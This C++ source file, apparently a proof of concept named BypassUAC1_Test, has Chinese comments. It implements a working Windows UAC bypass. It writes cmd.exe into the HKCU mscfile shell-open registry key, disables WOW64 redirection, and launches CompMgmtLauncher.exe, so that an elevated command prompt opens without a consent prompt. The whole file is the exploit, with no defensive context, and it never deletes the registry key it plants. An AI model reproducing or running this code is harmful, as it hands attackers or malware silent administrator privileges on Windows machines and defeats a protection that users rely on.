// BypassUAC1_Test.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <Windows.h>


void ShowError(char *pszText)
{
	char szErr[MAX_PATH] = { 0 };
	::wsprintf(szErr, "%s Error[%d]\n", pszText, ::GetLastError());
#ifdef _DEBUG
	::MessageBox(NULL, szErr, "ERROR", MB_OK | MB_ICONERROR);
#endif
}


// 修改注册表
BOOL SetReg(char *lpszExePath)
{
	HKEY hKey = NULL;
	// 创建项
	::RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Classes\\mscfile\\Shell\\Open\\Command", 0, NULL, 0, KEY_WOW64_64KEY | KEY_ALL_ACCESS, NULL, &hKey, NULL);
	if (NULL == hKey)
	{
		ShowError("RegCreateKeyEx");
		return FALSE;
	}
	// 设置键值
	::RegSetValueEx(hKey, NULL, 0, REG_SZ, (BYTE *)lpszExePath, (1 + ::lstrlen(lpszExePath)));
	// 关闭注册表
	::RegCloseKey(hKey);
	return TRUE;
}


int _tmain(int argc, _TCHAR* argv[])
{
	BOOL bRet = FALSE;
	PVOID OldValue = NULL;
	// 关闭文件重定位
	::Wow64DisableWow64FsRedirection(&OldValue);

	// 修改注册表
	bRet = SetReg("C:\\Windows\\System32\\cmd.exe");
	if (bRet)
	{
		// 运行 CompMgmtLauncher.exe
		system("CompMgmtLauncher.exe");
		printf("Run OK!\n");
	}
	else
	{
		printf("Run ERROR!\n");
	}

	// 恢复文件重定位
	::Wow64RevertWow64FsRedirection(OldValue);

	system("pause");
	return 0;
}

